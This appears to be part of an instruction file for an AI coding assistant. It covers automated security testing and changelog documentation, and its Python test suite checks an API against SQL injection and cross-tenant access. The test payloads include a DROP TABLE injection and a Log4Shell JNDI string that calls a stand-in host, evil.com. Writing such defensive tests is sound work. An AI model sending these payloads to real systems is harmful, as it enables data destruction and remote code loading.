## Security Testing Automation

```markdown
## Automated Security Test Suite
<think harder about comprehensive security testing>

### Generated Security Tests
```python
# SQL Injection Test Suite
def test_sql_injection_in_search():
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "' UNION SELECT * FROM information_schema.tables--",
        "${jndi:ldap://evil.com/a}",  # Log4Shell
    ]
    
    for payload in payloads:
        response = api_client.search(payload)
        assert response.status_code != 500, f"SQL injection possible with: {payload}"
        assert "error" not in response.text.lower()
        assert "syntax" not in response.text.lower()

# Multi-Tenant Isolation Test
def test_tenant_isolation():
    # Create data in tenant A
    tenant_a_token = auth.login("tenant_a_user")
    tenant_a_data = api_client.create_resource(tenant_a_token, {"name": "secret"})
    
    # Try to access from tenant B
    tenant_b_token = auth.login("tenant_b_user")
    response = api_client.get_resource(tenant_b_token, tenant_a_data.id)
    
    assert response.status_code == 404, "Tenant isolation breach detected!"
```

Confidence: 90%
```

Remember: Your enhanced capabilities allow you to think like both defender and attacker. Use parallel analysis for comprehensive coverage, extended thinking for complex vulnerabilities, and always provide confidence scores to help teams prioritize security efforts. Security is not optional - it's fundamental.


## Documentation Reminders

<think about what documentation updates the implemented changes require>

When your analysis leads to implemented changes, ensure proper documentation:

### Documentation Checklist (Confidence Scoring)
- **CHANGELOG.md** - Update if changes implemented (Confidence: [X]%)
- **FEATURES.md** - Update if capabilities added/modified (Confidence: [X]%)
- **CLAUDE.md** - Update if patterns/conventions introduced (Confidence: [X]%)

### Recommended Updates
Based on the changes suggested:

1. **For Bug Fixes**: 
   ```markdown
   /update-changelog "Fixed [issue description]"
   ```

2. **For New Features**:
   ```markdown
   /update-changelog "Added [feature description]"
   ```

3. **For Refactoring**:
   ```markdown
   /update-changelog "Changed [component] to [improvement]"
   ```

### Important
- Use confidence scores to prioritize documentation updates
- High confidence (>90%) = Critical to document
- Medium confidence (70-90%) = Should document
- Low confidence (<70%) = Consider documenting

**Remember**: Well-documented changes help the entire team understand system evolution!
